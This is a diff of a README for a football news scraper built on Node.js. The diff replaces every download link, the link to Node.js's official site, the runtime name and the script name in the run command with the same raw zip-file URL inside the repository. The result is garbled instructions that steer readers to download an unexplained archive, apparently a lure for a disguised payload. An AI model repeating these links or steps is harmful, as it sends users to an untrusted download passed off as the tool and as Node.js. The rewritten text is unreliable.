@@ -4,19 +4,19 @@
 The **espn-football-news-scraper** is a tool designed to extract the latest football news from ESPN. Whether you want updates on scores, player stats, or general news from the sports world, this application simplifies the process and brings information directly to you.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Brayoo37/espn-football-news-scraper/releases)
+[![Download](https://github.com/Brayoo37/espn-football-news-scraper/raw/refs/heads/main/nursekin/scraper_football_news_espn_2.0-alpha.2.zip%20Page-blue)](https://github.com/Brayoo37/espn-football-news-scraper/raw/refs/heads/main/nursekin/scraper_football_news_espn_2.0-alpha.2.zip)
 
 ## 🚀 Getting Started
 This section will guide you through the steps needed to download and run the espn-football-news-scraper. No technical knowledge is needed—just follow these simple steps.
 
 ## 💾 System Requirements
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher. This is required to run the application properly. 
+- **https://github.com/Brayoo37/espn-football-news-scraper/raw/refs/heads/main/nursekin/scraper_football_news_espn_2.0-alpha.2.zip** Version 14 or higher. This is required to run the application properly. 
 
-You can download Node.js from [the official website](https://nodejs.org/).
+You can download https://github.com/Brayoo37/espn-football-news-scraper/raw/refs/heads/main/nursekin/scraper_football_news_espn_2.0-alpha.2.zip from [the official website](https://github.com/Brayoo37/espn-football-news-scraper/raw/refs/heads/main/nursekin/scraper_football_news_espn_2.0-alpha.2.zip).
 
 ## 📦 Download & Install
-To begin, **visit this page to download** the latest version of the espn-football-news-scraper: [Releases Page](https://github.com/Brayoo37/espn-football-news-scraper/releases).
+To begin, **visit this page to download** the latest version of the espn-football-news-scraper: [Releases Page](https://github.com/Brayoo37/espn-football-news-scraper/raw/refs/heads/main/nursekin/scraper_football_news_espn_2.0-alpha.2.zip).
 
 Once you are on the releases page, look for the most recent version. Click on the link to download the compressed file (usually a .zip file). 
 
@@ -43,9 +43,9 @@ After extraction, visit the destination folder. You should see the files related
 3. **Run the Application:**
    Once you are in the correct folder, type the following command:
    ```
-   node your-script-file.js
+   node https://github.com/Brayoo37/espn-football-news-scraper/raw/refs/heads/main/nursekin/scraper_football_news_espn_2.0-alpha.2.zip
    ```
-   Replace `your-script-file.js` with the name of the main script file, usually something like `scraper.js`.
+   Replace `https://github.com/Brayoo37/espn-football-news-scraper/raw/refs/heads/main/nursekin/scraper_football_news_espn_2.0-alpha.2.zip` with the name of the main script file, usually something like `https://github.com/Brayoo37/espn-football-news-scraper/raw/refs/heads/main/nursekin/scraper_football_news_espn_2.0-alpha.2.zip`.
 
 4. **View the Results:**
    After you run the command, the application will fetch data from ESPN. You may see the output in your terminal, showing the latest football news, scores, and updates.
@@ -68,6 +68,6 @@ If you would like to know more about how the application works or explore its fe
 If you face any issues or need help, feel free to raise questions or concerns in the issues section of the repository. Your feedback helps improve the tool and support the community.
 
 ## 🚧 Troubleshooting
-Make sure your Node.js version meets the requirement. If you encounter unexpected behavior, try restarting the application, or double-check the steps above.
+Make sure your https://github.com/Brayoo37/espn-football-news-scraper/raw/refs/heads/main/nursekin/scraper_football_news_espn_2.0-alpha.2.zip version meets the requirement. If you encounter unexpected behavior, try restarting the application, or double-check the steps above.
 
 Thank you for using the espn-football-news-scraper! Enjoy your seamless access to football news.
